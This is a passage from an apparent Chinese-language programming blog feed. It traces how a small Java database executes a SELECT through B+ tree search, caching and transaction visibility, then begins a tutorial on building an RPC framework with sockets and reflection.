            <span class="hljs-type">FieldCalRes</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> fd.calExp(where.singleExp1);  
            res.l0 = r.left; res.r0 = r.right;  
            <span class="hljs-keyword">break</span>;  
        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;or&quot;</span>:  <span class="hljs-comment">// or查询，两次查询结果取并集</span>
            res.single = <span class="hljs-literal">false</span>;  
            r = fd.calExp(where.singleExp1);  
            res.l0 = r.left; res.r0 = r.right;  
            r = fd.calExp(where.singleExp2);  
            res.l1 = r.left; res.r1 = r.right;  
            <span class="hljs-keyword">break</span>;  
        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;and&quot;</span>:  <span class="hljs-comment">// and查询 最后两个结果取交集</span>
            res.single = <span class="hljs-literal">true</span>;  
            r = fd.calExp(where.singleExp1);  
            res.l0 = r.left; res.r0 = r.right;  
            r = fd.calExp(where.singleExp2);  
            res.l1 = r.left; res.r1 = r.right;  
            <span class="hljs-keyword">if</span>(res.l1 &gt; res.l0) res.l0 = res.l1;  
            <span class="hljs-keyword">if</span>(res.r1 &lt; res.r0) res.r0 = res.r1;  
            <span class="hljs-keyword">break</span>;  
        <span class="hljs-keyword">default</span>:  
            <span class="hljs-keyword">throw</span> Error.InvalidLogOpException;  
    &#125;  
    <span class="hljs-keyword">return</span> res;  
&#125;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">CalWhereRes</span> &#123;  
    <span class="hljs-type">long</span> l0, r0, l1, r1;  
    <span class="hljs-type">boolean</span> single;  
&#125;</code></pre>

<p>在<code>calWhere(fd, where)</code>中，会使用<code>fd.calExp(where.singleExp1)</code>，其作用返回一个<code>CalWhereRes</code>类型的结果，其中包含结果的范围。</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> FieldCalRes <span class="hljs-title function_">calExp</span><span class="hljs-params">(SingleExpression exp)</span> <span class="hljs-keyword">throws</span> Exception &#123;  
    <span class="hljs-type">Object</span> <span class="hljs-variable">v</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  
    <span class="hljs-type">FieldCalRes</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FieldCalRes</span>();  
    <span class="hljs-keyword">switch</span>(exp.compareOp) &#123;  
        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;&lt;&quot;</span>:  
            res.left = <span class="hljs-number">0</span>;  
            v = string2Value(exp.value);  
            res.right = value2Uid(v);  
            <span class="hljs-keyword">if</span>(res.right &gt; <span class="hljs-number">0</span>) &#123;  
                res.right --;  
            &#125;  
            <span class="hljs-keyword">break</span>;  
        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;=&quot;</span>:  
            v = string2Value(exp.value);  
            res.left = value2Uid(v);  
            res.right = res.left;  
            <span class="hljs-keyword">break</span>;  
        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;&gt;&quot;</span>:  
            res.right = Long.MAX_VALUE;  
            v = string2Value(exp.value);  
            res.left = value2Uid(v) + <span class="hljs-number">1</span>;  
            <span class="hljs-keyword">break</span>;  
    &#125;  
    <span class="hljs-keyword">return</span> res;  
&#125;</code></pre>

<p><code>v = string2Value(exp.value);</code>在insert操作时也会使用<br><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230325122525.png"><br>将字段数据转换为数字ukey，便于精准查询和范围查询。所以经过<code>calExp()</code>函数的处理后便能够得到响应的左右边界，再到b+树中查询即可。<br><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230325123244.png"><br>此时的函数调用栈如下图<br><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230325123147.png"></p>
<p>接着回到<code>parseWhere(Where where)</code>函数中</p>
<pre><code class="hljs java">List&lt;Long&gt; uids = fd.search(l0, r0);  
<span class="hljs-keyword">if</span>(!single) &#123; <span class="hljs-comment">// 若为or查询 还要查询l1,r1范围并加入到结果集中 也就是并集  </span>
    List&lt;Long&gt; tmp = fd.search(l1, r1);  
    uids.addAll(tmp);  
&#125;  
<span class="hljs-keyword">return</span> uids;</code></pre>

<p>进入feild中查找<code>fd.search()</code>会调用b+tree的<code>searchRange()</code>方法</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;Long&gt; <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">long</span> left, <span class="hljs-type">long</span> right)</span> <span class="hljs-keyword">throws</span> Exception &#123;  
    <span class="hljs-keyword">return</span> bt.searchRange(left, right);  
&#125;</code></pre>

<p><code>searchRange()</code>代码逻辑如下</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;Long&gt; <span class="hljs-title function_">searchRange</span><span class="hljs-params">(<span class="hljs-type">long</span> leftKey, <span class="hljs-type">long</span> rightKey)</span> <span class="hljs-keyword">throws</span> Exception &#123;  
    <span class="hljs-type">long</span> <span class="hljs-variable">rootUid</span> <span class="hljs-operator">=</span> rootUid(); <span class="hljs-comment">// 获取根节点的UID  </span>
    <span class="hljs-type">long</span> <span class="hljs-variable">leafUid</span> <span class="hljs-operator">=</span> searchLeaf(rootUid, leftKey); <span class="hljs-comment">// 搜索左边界所在的叶子节点  </span>
    List&lt;Long&gt; uids = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  
    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) &#123;  
        <span class="hljs-type">Node</span> <span class="hljs-variable">leaf</span> <span class="hljs-operator">=</span> Node.loadNode(<span class="hljs-built_in">this</span>, leafUid); <span class="hljs-comment">// 加载叶子节点  </span>
        <span class="hljs-type">LeafSearchRangeRes</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> leaf.leafSearchRange(leftKey, rightKey); <span class="hljs-comment">// 在叶子节点中搜索符合条件的数据项  </span>
        leaf.release(); <span class="hljs-comment">// 释放叶子节点  </span>
        uids.addAll(res.uids); <span class="hljs-comment">// 将符合条件的数据项的UID添加到结果列表中  </span>
        <span class="hljs-keyword">if</span>(res.siblingUid == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// 如果没有兄弟节点，则说明已经搜完了所有符合条件的数据项  </span>
            <span class="hljs-keyword">break</span>;  
        &#125; <span class="hljs-keyword">else</span> &#123;  
            leafUid = res.siblingUid; <span class="hljs-comment">// 否则，继续搜索下一个兄弟节点  </span>
        &#125;  
    &#125;  
    <span class="hljs-keyword">return</span> uids;  
&#125;</code></pre>

<p>经过<code>leaf.leafSearchRange(leftKey, rightKey);</code>便可以得到符合条件的uid<br><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230325125823.png"><br>再返回到<code>searchRange()</code>中</p>
<pre><code class="hljs java"><span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) &#123;  
    <span class="hljs-type">Node</span> <span class="hljs-variable">leaf</span> <span class="hljs-operator">=</span> Node.loadNode(<span class="hljs-built_in">this</span>, leafUid); <span class="hljs-comment">// 加载叶子节点  </span>
    <span class="hljs-type">LeafSearchRangeRes</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> leaf.leafSearchRange(leftKey, rightKey); <span class="hljs-comment">// 在叶子节点中搜索符合条件的数据项  </span>
    leaf.release(); <span class="hljs-comment">// 释放叶子节点  </span>
    uids.addAll(res.uids); <span class="hljs-comment">// 将符合条件的数据项的UID添加到结果列表中  </span>
    <span class="hljs-keyword">if</span>(res.siblingUid == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// 如果没有兄弟节点，则说明已经搜完了所有符合条件的数据项  </span>
        <span class="hljs-keyword">break</span>;  
    &#125; <span class="hljs-keyword">else</span> &#123;  
        leafUid = res.siblingUid; <span class="hljs-comment">// 否则，继续搜索下一个兄弟节点  </span>
    &#125;  
&#125;  
<span class="hljs-keyword">return</span> uids;</code></pre>

<p>释放叶子节点，将满足条件的uid加入到集合，返回给<code>feild.search()</code>，再返回到<code>table.search()</code>，此时回到<code>table.read(xid, read)</code>中</p>
<pre><code class="hljs java"><span class="hljs-comment">// 执行完的代码注释了</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">read</span><span class="hljs-params">(<span class="hljs-type">long</span> xid, Select read)</span> <span class="hljs-keyword">throws</span> Exception &#123;  
    <span class="hljs-comment">// 解析where条件并得到需要查询的uid列表  </span>
    <span class="hljs-comment">//List&lt;Long&gt; uids = parseWhere(read.where);  </span>
    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();  
    <span class="hljs-comment">// 循环遍历uids列表，逐个查询对应的记录，并输出结果  </span>
    <span class="hljs-keyword">for</span> (Long uid : uids) &#123;  
        <span class="hljs-type">byte</span>[] raw = ((TableManagerImpl)tbm).vm.read(xid, uid);  
        <span class="hljs-keyword">if</span>(raw == <span class="hljs-literal">null</span>) <span class="hljs-keyword">continue</span>;  
        Map&lt;String, Object&gt; entry = parseEntry(raw);  
        sb.append(printEntry(entry)).append(<span class="hljs-string">&quot;\n&quot;</span>);  
    &#125;  
    <span class="hljs-keyword">return</span> sb.toString();  
&#125;</code></pre>

<p>接下来遍历uids列表，交给vm模块，读取uid。<code>vm.read(xid, uid)</code>代码如下，VM继承了计数缓存框架，会先到缓存中查找数据，也就是<code>entry = super.get(uid);</code>这行代码。</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] read(<span class="hljs-type">long</span> xid, <span class="hljs-type">long</span> uid) <span class="hljs-keyword">throws</span> Exception &#123;  
    lock.lock();  
    <span class="hljs-type">Transaction</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> activeTransaction.get(xid);  
    lock.unlock();  
  
    <span class="hljs-keyword">if</span>(t.err != <span class="hljs-literal">null</span>) &#123;  
        <span class="hljs-keyword">throw</span> t.err;  
    &#125;  
  
    <span class="hljs-type">Entry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  
    <span class="hljs-keyword">try</span> &#123;  
        entry = <span class="hljs-built_in">super</span>.get(uid);  <span class="hljs-comment">// VM继承了计数缓存框架，会先到缓存中查找数据</span>
    &#125; <span class="hljs-keyword">catch</span>(Exception e) &#123;  
        <span class="hljs-keyword">if</span>(e == Error.NullEntryException) &#123;  
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  
        &#125; <span class="hljs-keyword">else</span> &#123;  
            <span class="hljs-keyword">throw</span> e;  
        &#125;  
    &#125;  
    <span class="hljs-keyword">try</span> &#123;  
        <span class="hljs-keyword">if</span>(Visibility.isVisible(tm, t, entry)) &#123;  
            <span class="hljs-keyword">return</span> entry.data();  
        &#125; <span class="hljs-keyword">else</span> &#123;  
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  
        &#125;  
    &#125; <span class="hljs-keyword">finally</span> &#123;  
        entry.release();  
    &#125;  
&#125;</code></pre>

<p>接下来进入<code>AbstractCache.get()</code>,代码很长。</p>
<pre><code class="hljs java"><span class="hljs-keyword">protected</span> T <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">long</span> key)</span> <span class="hljs-keyword">throws</span> Exception &#123;  
    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) &#123;  
        lock.lock();  
        <span class="hljs-keyword">if</span>(getting.containsKey(key)) &#123; <span class="hljs-comment">// getting为正在获取某资源的线程  </span>
            <span class="hljs-comment">// 请求的资源正在被其他线程获取  </span>
            lock.unlock();  
            <span class="hljs-keyword">try</span> &#123;  
                Thread.sleep(<span class="hljs-number">1</span>);  
            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;  
                e.printStackTrace();  
                <span class="hljs-keyword">continue</span>;  
            &#125;  
            <span class="hljs-keyword">continue</span>;  
        &#125;  
  
        <span class="hljs-keyword">if</span>(cache.containsKey(key)) &#123;  
            <span class="hljs-comment">// 资源在缓存中，直接返回  </span>
            <span class="hljs-type">T</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> cache.get(key);  
            <span class="hljs-comment">// 将事务xid加入到引用了该uid的列表中</span>
            references.put(key, references.get(key) + <span class="hljs-number">1</span>);  
            lock.unlock();  
            <span class="hljs-keyword">return</span> obj;  
        &#125;  
  
        <span class="hljs-comment">// 尝试获取该资源  maxResource是缓存的最大缓存资源数  </span>
        <span class="hljs-keyword">if</span>(maxResource &gt; <span class="hljs-number">0</span> &amp;&amp; count == maxResource) &#123;  
            lock.unlock();  
            <span class="hljs-keyword">throw</span> Error.CacheFullException;  
        &#125;  
        count ++;  
        getting.put(key, <span class="hljs-literal">true</span>);  
        lock.unlock();  
        <span class="hljs-keyword">break</span>;  
    &#125;  
  
    <span class="hljs-type">T</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  
    <span class="hljs-keyword">try</span> &#123;  
        <span class="hljs-comment">// 资源不在缓存中时  </span>
        obj = getForCache(key);  
    &#125; <span class="hljs-keyword">catch</span>(Exception e) &#123;  
        lock.lock();  
        count --;  
        getting.remove(key);  
        lock.unlock();  
        <span class="hljs-keyword">throw</span> e;  
    &#125;  
  
    lock.lock();  
    getting.remove(key);  
    cache.put(key, obj);  <span class="hljs-comment">// 将从磁盘中加载的</span>
    references.put(key, <span class="hljs-number">1</span>);  
    lock.unlock();  
      
    <span class="hljs-keyword">return</span> obj;  
&#125;</code></pre>

<p>因为是第一次查询所以，肯定不在缓存中，需要到磁盘中查找<code>obj = getForCache(key)</code></p>
<pre><code class="hljs java"><span class="hljs-keyword">protected</span> Entry <span class="hljs-title function_">getForCache</span><span class="hljs-params">(<span class="hljs-type">long</span> uid)</span> <span class="hljs-keyword">throws</span> Exception &#123;  
    <span class="hljs-type">Entry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> Entry.loadEntry(<span class="hljs-built_in">this</span>, uid);  
    <span class="hljs-keyword">if</span>(entry == <span class="hljs-literal">null</span>) &#123;  
        <span class="hljs-keyword">throw</span> Error.NullEntryException;  
    &#125;  
    <span class="hljs-keyword">return</span> entry;  
&#125;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Entry <span class="hljs-title function_">loadEntry</span><span class="hljs-params">(VersionManager vm, <span class="hljs-type">long</span> uid)</span> <span class="hljs-keyword">throws</span> Exception &#123;  
    <span class="hljs-type">DataItem</span> <span class="hljs-variable">di</span> <span class="hljs-operator">=</span> ((VersionManagerImpl)vm).dm.read(uid);  
    <span class="hljs-keyword">return</span> newEntry(vm, di, uid);  
&#125;</code></pre>

<p>获取到entry后,回到<code>AbstractCache.get()</code></p>
<pre><code class="hljs java">lock.lock();  
getting.remove(key);  
cache.put(key, obj);  <span class="hljs-comment">// 将从磁盘中加载的entry放入缓存</span>
references.put(key, <span class="hljs-number">1</span>);  
lock.unlock();</code></pre>

<p>此时的调用栈如下<br><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230325132416.png"><br>继续返回，回到<code>vm.read(xid, uid)</code>中，判断可见性后返回记录。</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] read(<span class="hljs-type">long</span> xid, <span class="hljs-type">long</span> uid) <span class="hljs-keyword">throws</span> Exception &#123;  
	... <span class="hljs-comment">//已执行的代码</span>
    <span class="hljs-keyword">try</span> &#123;  
        <span class="hljs-keyword">if</span>(Visibility.isVisible(tm, t, entry)) &#123;  
            <span class="hljs-keyword">return</span> entry.data();  
        &#125; <span class="hljs-keyword">else</span> &#123;  
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  
        &#125;  
    &#125; <span class="hljs-keyword">finally</span> &#123;  
        entry.release();</code></pre>

<p>返回到<code>table.read()</code>中,获取的记录如下<br><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230325133026.png"><br>继续向上返回到<code>tbm.read()</code>，继续返回到主函数，控制台打印结果如下<br><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230325133301.png"></p>
<p>整个过程有亿点点的复杂，<a href="https://ziyang.moe/">真佩服作者</a></p>
<h2 id="分析隔离级别"><a href="#分析隔离级别" class="headerlink" title="分析隔离级别"></a>分析隔离级别</h2><h3 id="读已提交"><a href="#读已提交" class="headerlink" title="读已提交"></a>读已提交</h3><p>准备两个测试用例，第一个为创建表后向其中插入一条数据</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;

        TransactionManagerImpl tm= TransactionManager.create(<span class="hljs-string">&quot;cun/tm&quot;</span>);
        DataManager dm=DataManager.create(<span class="hljs-string">&quot;cun/dm&quot;</span>,<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">20</span>,tm);
        VersionManager vm= VersionManager.newVersionManager(tm,dm);
        TableManager tbm=TableManager.create(<span class="hljs-string">&quot;cun/&quot;</span>,vm,dm);

        <span class="hljs-type">byte</span>[] res;
        <span class="hljs-type">Executor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Executor</span>(tbm);
        <span class="hljs-type">String</span> <span class="hljs-variable">begin</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;begin&quot;</span>;
        <span class="hljs-type">byte</span>[] beginBytes = begin.getBytes(StandardCharsets.UTF_8);
        String createTB=<span class="hljs-string">&quot;create table students &quot;</span> +
                <span class="hljs-string">&quot;name string,age int32 &quot;</span> +
                <span class="hljs-string">&quot;(index name age)&quot;</span>;
        <span class="hljs-type">byte</span>[] createTBBytes=createTB.getBytes(StandardCharsets.UTF_8);

        String insertSQL=<span class="hljs-string">&quot;insert into students values xiaosun 18&quot;</span>;
        <span class="hljs-type">byte</span>[] insertSQLBytes = insertSQL.getBytes(StandardCharsets.UTF_8);
        <span class="hljs-keyword">try</span> &#123;
            <span class="hljs-type">byte</span>[] bytes = executor.execute(beginBytes);
            res = executor.execute(createTBBytes);
            System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(res));
            executor.execute(insertSQLBytes);
        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
            e.printStackTrace();
        &#125;
    &#125;</code></pre>

<p>第二测试用例为查询上述插入的数据</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;

        TransactionManagerImpl tm= TransactionManager.open(<span class="hljs-string">&quot;cun/tm&quot;</span>);
        DataManager dm=DataManager.open(<span class="hljs-string">&quot;cun/dm&quot;</span>,<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">20</span>,tm);
        VersionManager vm= VersionManager.newVersionManager(tm,dm);
        TableManager tbm=TableManager.open(<span class="hljs-string">&quot;cun/&quot;</span>,vm,dm);

        <span class="hljs-comment">//开启事务</span>
<span class="hljs-comment">//        BeginRes br=tbm.begin(new Begin());</span>
        <span class="hljs-type">byte</span>[] res;
        <span class="hljs-type">Executor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Executor</span>(tbm);
        <span class="hljs-type">String</span> <span class="hljs-variable">begin</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;begin&quot;</span>;
        <span class="hljs-type">byte</span>[] beginBytes = begin.getBytes(StandardCharsets.UTF_8);
        String selectSQL=<span class="hljs-string">&quot;select name,age from students where age=18&quot;</span>;
        <span class="hljs-type">byte</span>[] selectSQLBytes=selectSQL.getBytes(StandardCharsets.UTF_8);
        <span class="hljs-keyword">try</span> &#123;
            <span class="hljs-type">byte</span>[] bytes = executor.execute(beginBytes);
            res = executor.execute(selectSQLBytes);
            System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(res));
        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
            e.printStackTrace();
        &#125;
    &#125;</code></pre>

<p>首先执行test1，执行到<code>byte[] execute = executor.execute(commitSQLBytes);</code>,停止，在test2中查看是否可以查询到该记录</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230325214413974.png" alt="image-20230325214413974"></p>
<p>再将test1中的commit语句放行，再次运行test2，可以成功查询到，也就是实现了读已提交的隔离级别</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230325214623529.png" alt="image-20230325214623529"></p>
<h3 id="可重复读"><a href="#可重复读" class="headerlink" title="可重复读"></a>可重复读</h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2>]]></content>
  </entry>
  <entry>
    <title>RPC</title>
    <url>/2023/08/02/RPC/</url>
    <content><![CDATA[<h1 id="RPC框架的实现"><a href="#RPC框架的实现" class="headerlink" title="RPC框架的实现"></a>RPC框架的实现</h1><h2 id="RPC是什么？"><a href="#RPC是什么？" class="headerlink" title="RPC是什么？"></a>RPC是什么？</h2><p>RPC（Remote Procedure Call，远程过程调用）是一种计算机通信协议，用于在分布式系统中使一个程序调用另一个程序的过程看起来像本地过程调用一样。它允许在不同的计算机或网络上运行的程序之间进行通信和交互。</p>
<p>RPC的基本工作原理如下：</p>
<ol>
<li>客户端（调用方）调用一个远程过程，就像调用本地函数一样。客户端不需要关心远程过程的实际位置或运行在哪台计算机上。</li>
<li>客户端的请求被封装成一个消息，包括远程过程的标识符、参数等信息。</li>
<li>这个消息通过网络传输到远程计算机上的服务器端。</li>
<li>服务器端接收到消息后，解析消息，执行相应的远程过程，然后将结果封装成响应消息。</li>
<li>服务器端将响应消息发送回客户端。</li>
<li>客户端接收到响应消息后，解析响应并获取远程过程的结果。</li>
</ol>
<p>RPC的目标是隐藏底层的通信细节，使远程过程调用的过程对程序员来说尽可能透明和简单。这使得构建分布式系统和客户端-服务器应用程序变得更加容易，因为开发者可以将远程服务看作是本地的函数调用，而不必担心网络通信的细节。</p>
<p>在代码上展示就是如下形式：</p>
<p>服务提供方提供的接口</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">HelloService</span> &#123;
    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String msg)</span>;
&#125;
</code></pre>

<p>客户端进行远程调用</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;
        <span class="hljs-type">HelloService</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> ?   				<span class="hljs-comment">// 获取接口的代理对象</span>
        service.sayHello(<span class="hljs-string">&quot;Hello world!&quot;</span>);
&#125;</code></pre>

<p>其中HelloService就是服务提供方提供的服务，但是在客户端不存在该接口的实现类，所以此时需要进行远程过程调用。既然要远程，客户端与服务端就需要进行网络通信，以传输必要的的调用信息，包括调用服务的接口名，方法名，方法的参数类型，参数，就是如下的类</p>
<pre><code class="hljs java"><span class="hljs-meta">@Data</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Invocation</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;
    <span class="hljs-keyword">private</span> String interfaceName;

    <span class="hljs-keyword">private</span> String methodName;

    <span class="hljs-keyword">private</span> Class[] parameterTypes;

    <span class="hljs-keyword">private</span> String version;

    <span class="hljs-keyword">private</span> Object[] parameters;
&#125;</code></pre>

<p>下面就是将信息进行传输</p>
<h2 id="Socket实现网络通信"><a href="#Socket实现网络通信" class="headerlink" title="Socket实现网络通信"></a>Socket实现网络通信</h2><p>首先服务端</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">RpcRequestHandler</span> <span class="hljs-variable">rpcRequestHandler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RpcRequestHandler</span>();

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(<span class="hljs-type">int</span> port)</span> <span class="hljs-keyword">throws</span> IOException &#123;
        <span class="hljs-keyword">try</span> (<span class="hljs-type">ServerSocket</span> <span class="hljs-variable">serverSocket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerSocket</span>(port)) &#123;
            Socket socket;
            <span class="hljs-keyword">while</span>((socket = serverSocket.accept()) != <span class="hljs-literal">null</span>) &#123;
                System.out.println(<span class="hljs-string">&quot;Connecting to &quot;</span> + socket.getRemoteSocketAddress());
                <span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(socket.getInputStream())) &#123;
                    <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(socket.getOutputStream());
                  	<span class="hljs-comment">// 获取客户端的请求信息</span>
                    Invocation invocation= (Invocation) objectInputStream.readObject();
                    System.out.println(<span class="hljs-string">&quot;Invocation info: &quot;</span> + invocation.toString());
                    <span class="hljs-comment">// 调用目标方法</span>
                    <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> rpcRequestHandler.handle(invocation);
                    objectOutputStream.writeObject(result);
                    objectOutputStream.flush();
                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;
                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);
                &#125;
            &#125;
        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);
        &#125;
    &#125;
&#125;</code></pre>

<p>客户端</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;

    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">send</span><span class="hljs-params">(Invocation invocation, String host, <span class="hljs-type">int</span> port)</span> &#123;
        <span class="hljs-keyword">try</span>(<span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>(host, port)) &#123;
            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(socket.getOutputStream());
            <span class="hljs-comment">// 通过输出流向服务端发送消息</span>
            objectOutputStream.writeObject(invocation);
            <span class="hljs-comment">// 获取服务端的消息</span>
            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(socket.getInputStream());
            <span class="hljs-keyword">return</span> objectInputStream.readObject();

        &#125; <span class="hljs-keyword">catch</span> (UnknownHostException e) &#123;
            e.printStackTrace();
        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;
            e.printStackTrace();
        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;
            e.printStackTrace();
        &#125;
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    &#125;
&#125;</code></pre>

<p>socket实现通信的过程比较简单，最重要的是RpcRequestHandler的实现，其功能就是从注册中心获取到客户端调用的服务，通过反射机制调用目标方法，并返回执行结果</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RpcRequestHandler</span> &#123;

    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">handle</span><span class="hljs-params">(Invocation invocation)</span> &#123;
         <span class="hljs-comment">// 从本地注册中心获取服务</span>
        <span class="hljs-type">Class</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> LocalRegister.getClass(invocation.getInterfaceName(), invocation.getVersion());
        <span class="hljs-keyword">return</span> invokeTargetMethod(invocation, service);
    &#125;

    <span class="hljs-keyword">private</span> Object <span class="hljs-title function_">invokeTargetMethod</span><span class="hljs-params">(Invocation rpcRequest, Class service)</span> &#123;
        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;

        <span class="hljs-keyword">try</span> &#123;
            <span class="hljs-comment">// 获取service中目标方法，通过传递方法名和参数类型来获取特定的方法</span>
            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> service.getMethod(rpcRequest.getMethodName(), rpcRequest.getParameterTypes());
            result = method.invoke(service.newInstance(), rpcRequest.getParameters());
            System.out.printf(<span class="hljs-string">&quot;service:[%s] successful invoke method:[%s]&quot;</span>, rpcRequest.getInterfaceName(), rpcRequest.getMethodName());
        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;
            e.printStackTrace();
        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;
            e.printStackTrace();
